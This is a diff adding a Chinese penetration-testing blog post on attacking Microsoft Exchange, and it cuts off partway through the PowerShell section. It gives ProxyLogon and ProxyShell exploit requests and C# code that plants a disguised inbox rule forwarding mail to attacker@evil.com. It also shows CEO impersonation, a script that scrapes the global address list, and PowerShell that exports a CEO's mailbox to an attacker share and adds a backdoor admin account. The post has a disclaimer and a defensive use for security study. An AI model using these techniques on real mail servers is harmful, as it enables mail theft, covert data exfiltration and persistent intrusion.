@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Exchange Server 与 AD 域控深度集成且默认暴露大量 Web 端点于公网，是 APT 组织与红队的高价值目标。本文系统梳理 Exchange 的攻击面：ProxyShell&#x2F;ProxyLogon 漏洞链、EWS API 利用、OAB 虚拟目录、PowerShell Remoting、邮件转发规则后门、邮箱搜索与 SSRF 攻击链，附代码示例与流程图。 免责声明： 本文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exchange邮件服务器攻击面">
+<meta property="og:url" content="https://congliang.github.io/Intranet-Exchange-attacks/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Exchange Server 与 AD 域控深度集成且默认暴露大量 Web 端点于公网，是 APT 组织与红队的高价值目标。本文系统梳理 Exchange 的攻击面：ProxyShell&#x2F;ProxyLogon 漏洞链、EWS API 利用、OAB 虚拟目录、PowerShell Remoting、邮件转发规则后门、邮箱搜索与 SSRF 攻击链，附代码示例与流程图。 免责声明： 本文">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-11-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.901Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-Exchange-attacks/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-Exchange-attacks/","path":"Intranet-Exchange-attacks/","title":"Exchange邮件服务器攻击面"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Exchange邮件服务器攻击面 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Exchange-%E6%94%BB%E5%87%BB%E9%9D%A2%E6%80%BB%E8%A7%88"><span class="nav-number">2.</span> <span class="nav-text">一、Exchange 攻击面总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ProxyLogon-%E6%BC%8F%E6%B4%9E%E9%93%BE-CVE-2021-26855"><span class="nav-number">3.</span> <span class="nav-text">二、ProxyLogon 漏洞链 (CVE-2021-26855)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81ProxyShell-%E6%BC%8F%E6%B4%9E%E9%93%BE"><span class="nav-number">4.</span> <span class="nav-text">三、ProxyShell 漏洞链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-CVE-2021-34473-%E8%B7%AF%E5%BE%84%E6%B7%B7%E6%B7%86"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 CVE-2021-34473 路径混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-CVE-2021-34523-PowerShell-%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 CVE-2021-34523 PowerShell 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-ProxyShell-%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 ProxyShell 完整攻击链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81EWS-API-%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">四、EWS API 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%9E%9A%E4%B8%BE%E6%94%B6%E4%BB%B6%E7%AE%B1%E4%B8%8E%E5%88%9B%E5%BB%BA%E9%9A%90%E5%BD%A2%E8%BD%AC%E5%8F%91%E8%A7%84%E5%88%99"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 枚举收件箱与创建隐形转发规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-EWS-Impersonation%EF%BC%88%E7%94%A8%E6%88%B7%E6%A8%A1%E6%8B%9F%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 EWS Impersonation（用户模拟）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81OAB-%E8%99%9A%E6%8B%9F%E7%9B%AE%E5%BD%95%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">五、OAB 虚拟目录攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Exchange-PowerShell-Remoting"><span class="nav-number">7.</span> <span class="nav-text">六、Exchange PowerShell Remoting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E9%82%AE%E4%BB%B6%E8%BD%AC%E5%8F%91%E8%A7%84%E5%88%99%E5%90%8E%E9%97%A8"><span class="nav-number">8.</span> <span class="nav-text">七、邮件转发规则后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%82%AE%E7%AE%B1%E6%90%9C%E7%B4%A2%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96"><span class="nav-number">9.</span> <span class="nav-text">八、邮箱搜索与数据窃取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81Exchange-SSRF-%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">10.</span> <span class="nav-text">九、Exchange SSRF 完整攻击链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">11.</span> <span class="nav-text">十、检测与防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">12.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-Exchange-attacks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Exchange邮件服务器攻击面 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Exchange邮件服务器攻击面
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-11-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-11-05T08:00:00+08:00">2025-11-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Exchange Server 与 AD 域控深度集成且默认暴露大量 Web 端点于公网，是 APT 组织与红队的高价值目标。本文系统梳理 Exchange 的攻击面：ProxyShell&#x2F;ProxyLogon 漏洞链、EWS API 利用、OAB 虚拟目录、PowerShell Remoting、邮件转发规则后门、邮箱搜索与 SSRF 攻击链，附代码示例与流程图。</p>
+<p><strong>免责声明：</strong> 本文技术仅供安全研究与授权测试使用，严禁用于非法入侵。</p>
+<hr>
+<h2 id="一、Exchange-攻击面总览"><a href="#一、Exchange-攻击面总览" class="headerlink" title="一、Exchange 攻击面总览"></a>一、Exchange 攻击面总览</h2><p>Exchange 前端 CAS 托管于 IIS，对外暴露以下虚拟目录构成主要 Web 攻击面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────┬──────────────────────────────────┐</span><br><span class="line">│ /owa         │ OWA   — Outlook Web App         │</span><br><span class="line">│ /ecp         │ EAC   — Exchange 管理中心        │</span><br><span class="line">│ /ews         │ EWS   — Exchange Web Services   │</span><br><span class="line">│ /autodiscover│       自动发现服务               │</span><br><span class="line">│ /oab         │ OAB   — 脱机通讯簿 (含GAL)      │</span><br><span class="line">│ /powershell  │       PowerShell Remoting HTTP  │</span><br><span class="line">│ /mapi /rpc   │       MAPI/RPC over HTTP        │</span><br><span class="line">│ /activesync  │       ActiveSync 移动设备同步    │</span><br><span class="line">└──────────────┴──────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>攻击面归纳：</p>
+<table>
+<thead>
+<tr>
+<th>攻击面</th>
+<th>入口</th>
+<th>典型利用方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Web层漏洞</td>
+<td>OWA&#x2F;EAC&#x2F;EWS</td>
+<td>SSRF、反序列化、鉴权绕过</td>
+</tr>
+<tr>
+<td>API滥用</td>
+<td>EWS&#x2F;EWS Managed API</td>
+<td>合法接口恶意调用</td>
+</tr>
+<tr>
+<td>管理通道</td>
+<td>PowerShell Remoting</td>
+<td>远程命令执行与持久化</td>
+</tr>
+<tr>
+<td>邮件逻辑</td>
+<td>收件箱规则&#x2F;传输规则</td>
+<td>隐蔽邮件转发后门</td>
+</tr>
+<tr>
+<td>信息泄露</td>
+<td>OAB&#x2F;自动发现</td>
+<td>全局地址列表、组织架构窃取</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="二、ProxyLogon-漏洞链-CVE-2021-26855"><a href="#二、ProxyLogon-漏洞链-CVE-2021-26855" class="headerlink" title="二、ProxyLogon 漏洞链 (CVE-2021-26855)"></a>二、ProxyLogon 漏洞链 (CVE-2021-26855)</h2><p>ProxyLogon (CVE-2021-26855) 是 Exchange SSRF 漏洞，攻击者通过 <code>X-AnonResource-Backend</code> Cookie 绕过前端鉴权直接访问后端 (端口444)。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者 ── HTTP (X-AnonResource-Backend) ──&gt; 前端:443 ──鉴权绕过──&gt; 后端:444</span><br></pre></td></tr></table></figure>
+
+<p>第一步，访问 <code>/ecp/proxy.js</code> 获取管理员 LegacyDN：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /ecp/proxy.js HTTP/1.1</span><br><span class="line">Host: mail.target.com</span><br><span class="line">Cookie: X-AnonResource-Backend=exchange-backend.local/ecp/proxy.js#~1941962753</span><br><span class="line">X-BEResource: admin@target.com:444/ecp/proxy.js#~1941962753</span><br></pre></td></tr></table></figure>
+
+<p>第二步，利用返回的 LegacyDN 构造 SetObject 请求写入 webshell。第三步通过 GetObject 触发反序列化获取代码执行。</p>
+<hr>
+<h2 id="三、ProxyShell-漏洞链"><a href="#三、ProxyShell-漏洞链" class="headerlink" title="三、ProxyShell 漏洞链"></a>三、ProxyShell 漏洞链</h2><p>ProxyShell 由三个 CVE 组合：<strong>CVE-2021-34473</strong> (路径混淆鉴权绕过)、<strong>CVE-2021-34523</strong> (PowerShell 端点提权)、<strong>CVE-2021-31207</strong> (任意文件写入后反序列化 RCE)。</p>
+<h3 id="3-1-CVE-2021-34473-路径混淆"><a href="#3-1-CVE-2021-34473-路径混淆" class="headerlink" title="3.1 CVE-2021-34473 路径混淆"></a>3.1 CVE-2021-34473 路径混淆</h3><p>构造包含特殊字符的邮箱地址格式，使前端误判请求目标：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /autodiscover/autodiscover.json?@evil.com/ews/exchange.asmx?</span><br><span class="line">    &amp;Email=autodiscover/autodiscover.json%3F@evil.com HTTP/1.1</span><br><span class="line">Host: mail.target.com</span><br></pre></td></tr></table></figure>
+
+<p>攻击者利用路径中的 <code>?</code> 和 <code>@</code> 字符造成解析歧义，将未授权请求代理至后端 EWS 端点。</p>
+<h3 id="3-2-CVE-2021-34523-PowerShell-提权"><a href="#3-2-CVE-2021-34523-PowerShell-提权" class="headerlink" title="3.2 CVE-2021-34523 PowerShell 提权"></a>3.2 CVE-2021-34523 PowerShell 提权</h3><p><code>/powershell</code> 虚拟目录将 HTTP 请求转换为后端 PowerShell Remoting 会话。通过 SSRF 绕过后端鉴权后可直接注入命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$body</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="string">&quot;X-CommonAccessToken&quot;</span>   = <span class="string">&quot;构造的Token&quot;</span></span><br><span class="line">    <span class="string">&quot;X-PowerShell-Command&quot;</span>  = <span class="string">&quot;New-MailboxExportRequest -Mailbox user@target.com `</span></span><br><span class="line"><span class="string">                               -FilePath \\\\attacker\\share\\export.pst&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-ProxyShell-完整攻击链"><a href="#3-3-ProxyShell-完整攻击链" class="headerlink" title="3.3 ProxyShell 完整攻击链"></a>3.3 ProxyShell 完整攻击链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者 ──①路径混淆SSRF──&gt; 前端:443 ──③PS Remoting(SSRF隧道)──&gt; 后端:444</span><br><span class="line">  ^        &lt;──②后端响应──              &lt;──④命令执行⑤写shell──</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、EWS-API-利用"><a href="#四、EWS-API-利用" class="headerlink" title="四、EWS API 利用"></a>四、EWS API 利用</h2><p>EWS 是一套 SOAP API，攻击者获得凭证后可通过其实现邮件窃取、规则注入与日历监控。</p>
+<h3 id="4-1-枚举收件箱与创建隐形转发规则"><a href="#4-1-枚举收件箱与创建隐形转发规则" class="headerlink" title="4.1 枚举收件箱与创建隐形转发规则"></a>4.1 枚举收件箱与创建隐形转发规则</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ExchangeService service = <span class="keyword">new</span> ExchangeService(ExchangeVersion.Exchange2013_SP1);</span><br><span class="line">service.Credentials = <span class="keyword">new</span> WebCredentials(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;pass&quot;</span>, <span class="string">&quot;domain&quot;</span>);</span><br><span class="line">service.Url = <span class="keyword">new</span> Uri(<span class="string">&quot;https://mail.target.com/ews/exchange.asmx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举收件箱</span></span><br><span class="line">ItemView view = <span class="keyword">new</span> ItemView(<span class="number">50</span>);</span><br><span class="line">FindItemsResults&lt;Item&gt; results = service.FindItems(WellKnownFolderName.Inbox, view);</span><br><span class="line"><span class="keyword">foreach</span> (EmailMessage msg <span class="keyword">in</span> results) &#123; msg.Load(); Console.WriteLine(msg.Subject); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建隐形转发规则 (伪装为系统通知)</span></span><br><span class="line">Rule newRule = <span class="keyword">new</span> Rule &#123;</span><br><span class="line">    DisplayName = <span class="string">&quot;Microsoft_Update_Notification&quot;</span>, Priority = <span class="number">1</span>,</span><br><span class="line">    Conditions = <span class="keyword">new</span> RulePredicates(), Actions = <span class="keyword">new</span> RuleActions(), IsEnabled = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">newRule.Actions.ForwardToRecipients.Add(<span class="keyword">new</span> EmailAddress(<span class="string">&quot;attacker@evil.com&quot;</span>));</span><br><span class="line">newRule.Actions.Delete = <span class="literal">false</span>;</span><br><span class="line">service.UpdateInboxRules(</span><br><span class="line">    <span class="keyword">new</span> UpdateInboxRulesRequest &#123; Operations = &#123; <span class="keyword">new</span> CreateRuleOperation(newRule) &#125; &#125;,</span><br><span class="line">    WellKnownFolderName.Inbox);</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-EWS-Impersonation（用户模拟）"><a href="#4-2-EWS-Impersonation（用户模拟）" class="headerlink" title="4.2 EWS Impersonation（用户模拟）"></a>4.2 EWS Impersonation（用户模拟）</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service.ImpersonatedUserId = <span class="keyword">new</span> ImpersonatedUserId(</span><br><span class="line">    ConnectingIdType.SmtpAddress, <span class="string">&quot;ceo@target.com&quot;</span>);</span><br><span class="line"><span class="comment">// 此后所有 EWS 操作均以 CEO 身份执行</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、OAB-虚拟目录攻击"><a href="#五、OAB-虚拟目录攻击" class="headerlink" title="五、OAB 虚拟目录攻击"></a>五、OAB 虚拟目录攻击</h2><p>Offline Address Book (OAB) 存储全球地址列表 (GAL)，含所有用户邮箱、名称、部门信息。OAB 目录通常允许匿名或域认证访问，是内网信息收集的富矿。访问 <code>https://mail.target.com/oab/&lt;GUID&gt;/oab.xml</code> 可解析出完整组织架构（高管邮箱、部门层级等）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_oab</span>(<span class="params">base_url</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从 OAB 提取全局地址列表&quot;&quot;&quot;</span></span><br><span class="line">    resp = requests.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/oab/&quot;</span>, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 定位 GUID → 下载 oab.xml → 解析 Mailbox 节点</span></span><br><span class="line">    users = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> root.findall(<span class="string">&#x27;.//Mailbox&#x27;</span>):</span><br><span class="line">        users.append(&#123;</span><br><span class="line">            <span class="string">&#x27;email&#x27;</span>: item.find(<span class="string">&#x27;SmtpAddress&#x27;</span>).text,</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>:  item.find(<span class="string">&#x27;DisplayName&#x27;</span>).text,</span><br><span class="line">            <span class="string">&#x27;dept&#x27;</span>:  item.find(<span class="string">&#x27;Department&#x27;</span>).text</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">return</span> users</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、Exchange-PowerShell-Remoting"><a href="#六、Exchange-PowerShell-Remoting" class="headerlink" title="六、Exchange PowerShell Remoting"></a>六、Exchange PowerShell Remoting</h2><p>Exchange 管理 Shell 基于 WinRM，在获得域凭证后可直连执行管理命令。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立远程 Shell 会话</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(</span><br><span class="line">    <span class="string">&quot;target\admin&quot;</span>, (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;P@ssw0rd&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>))</span><br><span class="line"><span class="variable">$session</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ConfigurationName</span> Microsoft.Exchange `</span><br><span class="line">    <span class="literal">-ConnectionUri</span> <span class="string">&quot;https://exchange.target.com/powershell/&quot;</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> `</span><br><span class="line">    <span class="literal">-Authentication</span> Basic</span><br><span class="line"><span class="built_in">Import-PSSession</span> <span class="variable">$session</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用后渗透 cmdlet</span></span><br><span class="line"><span class="built_in">New-MailboxExportRequest</span> <span class="literal">-Mailbox</span> ceo@target.com `</span><br><span class="line">    <span class="literal">-FilePath</span> <span class="string">&quot;\\attacker-c2\share\ceo_mailbox.pst&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">New-Mailbox</span> <span class="literal">-Name</span> <span class="string">&#x27;svc_backup&#x27;</span> <span class="literal">-UserPrincipalName</span> <span class="string">&#x27;svc_backup@target.com&#x27;</span> `</span><br><span class="line">    <span class="literal">-Password</span> (<span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;P@ssw0rd123!&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>)</span><br><span class="line"><span class="built_in">Add-RoleGroupMember</span> <span class="string">&quot;Organization Management&quot;</span> <span class="literal">-Member</span> <span class="string">&quot;svc_backup&quot;</span></span><br><span 